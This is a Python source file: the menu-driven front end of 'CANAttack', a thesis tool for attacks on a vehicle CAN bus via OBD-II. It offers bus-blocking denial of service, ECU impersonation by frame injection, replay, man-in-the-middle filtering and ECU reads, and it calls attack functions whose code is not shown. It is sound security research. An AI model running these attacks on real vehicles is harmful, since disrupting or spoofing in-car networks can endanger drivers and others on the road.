#!/usr/bin/env python
"""
    CANAttack CAN Bus Attack-Software as part of my bachelor's thesis
    "Conception of a prototypical realization of selected attacks on the CAN bus via OBD-II".

    Program Logic for CANAttack.

    (c) Jannik Schmied, 2023
"""
import sys
import utils.core as core

from argparse import ArgumentParser, Namespace
from pyfiglet import figlet_format
from termcolor import colored
from utils.core import CANConnection, MITMFilter, MessageColorIndex as MCI, is_valid_bitrate, is_valid_com_port, is_valid_filter, mitm_filter_attack, replay_traffic
from utils.OBDLink import OBDConnection, OBDCommands


# Show extended error messages
DEBUG: bool = True


def parse_args() -> Namespace:
    """Parse command line arguments"""
    parser = ArgumentParser()
    parser.add_argument("--interface", "-i", help="Specify main CAN interface (vcan0 by default)", type=str)
    parser.add_argument("--mitm", "-m", help="Specify Man-In-The-Middle interface (vcan1 by default)", type=str)
    parser.add_argument("--priorityid", "-p", help="Set highest priority id (0x001 by default)", type=int)
    parser.add_argument("--com", "-c", help="Set COM port for serial device (COM9 by default)", type=str)
    parser.add_argument("--silent", "-s", help="Suppress superfluous outputs", action='store_true')
    parser.add_argument("--compatibility", help="Use python-can instead of SocketCAN", action='store_true')
    parser.add_argument("--pcan", help="Use PCAN USB(-FD) Dongle for Connection", action='store_true')
    parser.add_argument("--fd", help="Use for connection to CAN-FD targets", action='store_true')
    parser.add_argument("--baudrate", help="Set baudrate of CAN Bus (500 Kbit/s by default)", type=str)

    return parser.parse_args()


def main():
    args = parse_args()

    # Assign constants from args
    if args.priorityid:
        core.HIGHEST_PRIORITY_ID = args.priorityid

    if args.interface:
        core.CAN_INTERFACE = args.interface

    if args.mitm:
        core.MITM_INTERFACE = args.mitm

    if args.com:
        if is_valid_com_port(args.com):
            core.SERIAL_COM = args.com

    if args.silent:
        core.SILENT = args.silent

    core.COMPATIBILITY = args.compatibility
    core.USE_PCAN = args.pcan

    if args.fd:
        core.FD_MODE = True

    if args.baudrate:
        if is_valid_bitrate(args.baudrate):
            core.BAUDRATE = core.VALID_BITRATES[args.baudrate]

    # FIXME: Add pcan option
    try:
        can_socket = CANConnection(args.interface)
    except Exception as _:
        print(f"{core.MessageColorIndex.ERROR} Error initializing CAN Socket.")
        sys.exit(1)

    if not core.SILENT:
        print()
        print(figlet_format("CANATTACK"))
        print(f"(c) Jannik Schmied, 2023. Version {core.VERSION}")

    print("-" * 56)
    print(f"{MCI.BOLD('[1]')} Block CAN Bus (DoS)")
    print(f"{MCI.BOLD('[2]')} ECU Imitation")
    print(f"{MCI.BOLD('[3]')} Replay Attack")
    print(f"{MCI.BOLD('[4]')} MITM Filter Attack")
    print(f"{MCI.BOLD('[5]')} Read ECU Values via OBD II")
    print(f"{MCI.BOLD('[0]')} Exit")
    print("-" * 56)

    if not core.SILENT:
        print(f"{MCI.INFO} Interfaces: CAN: {core.CAN_INTERFACE}, MITM: {core.MITM_INTERFACE}")

    prompt: int = 0

    while True:
        try:
            prompt = int(input(f"{MCI.PROMPT} Selection: "))
        except KeyboardInterrupt:
            print(f"\n{MCI.INFO} Exit. (Interrupted by User)\n")
            sys.exit(0)
        except Exception as e:
            print(f"{MCI.ERROR} This is not a number...")
            if DEBUG:
                print(e)
            continue

        match prompt:
            case 1:
                can_socket.block()
                break
            case 2:
                input_target_id = input(f"{MCI.PROMPT} Insert Target-ID: ")
                input_data = input(f"{MCI.PROMPT} Insert data: ")
                input_count = input(f"{MCI.PROMPT} How many packets do you want to send: ")
                can_socket.imitate(target=input_target_id, data=input_data, count=input_count)
                break
            case 3:
                input_time = input(f"{MCI.PROMPT} How long do you want to dump (s): ")
                input_iterations = input(f"{MCI.PROMPT} How many times the dump should be replayed: ")
                replay_traffic(core.CAN_INTERFACE, input_time, input_iterations)
                break
            case 4:
                # Check if user has elevated permissions
                if not core.has_root_permissions():
                    print(f"{MCI.ERROR} No sudo, hmm? Come back with more permissions...")
                    continue
                input_timeout = input(f"{MCI.PROMPT} How long do you want to filter (s, Enter for no restriction): ")
                while True:
                    input_filter = input(f"{MCI.PROMPT} How do you want to filter ([<|>|=|*] 0x???, e.g. < 0x7E1): ")
                    if not is_valid_filter(input_filter):
                        print(f"{core.ERROR} Invalid filter!")
                        continue
                    break

                # Apply input to config
                core.MITM_FILTER = MITMFilter(input_filter)

                # Start attack
                mitm_filter_attack(core.MITM_INTERFACE, input_timeout)
                break
            case 5:
                obd_socket = OBDConnection()

                if not obd_socket.ready:
                    print(f"{MCI.ERROR} Error initializing OBD Device.")
                    sys.exit(1)

                OBDCommands.print_options()
                option: int = -1

                try:
                    option = int(input(f"{MCI.PROMPT} Selection: "))
                except TypeError:
                    print(f"{MCI.ERROR} Invalid selection.")
                    sys.exit(1)

                if option == 0:
                    print(f"{MCI.INFO} Exit. Bye!\n")
                    break

                if option not in range(1, len(OBDCommands.OPTIONS) + 1):
                    print(f"{MCI.ERROR} Selected option out of range!")
                    break

                command = OBDCommands.OPTIONS[option - 1]

                obd_socket.read(cmd=command)
                break
            case 0:
                print(f"{MCI.INFO} Exit. Bye!\n")
                break
            case _:
                print(f"{MCI.ERROR} The number you entered is out of range!")
                continue

    # Terminate program after finishing
    sys.exit(0)


# Main Loop
if __name__ == "__main__":
    main()
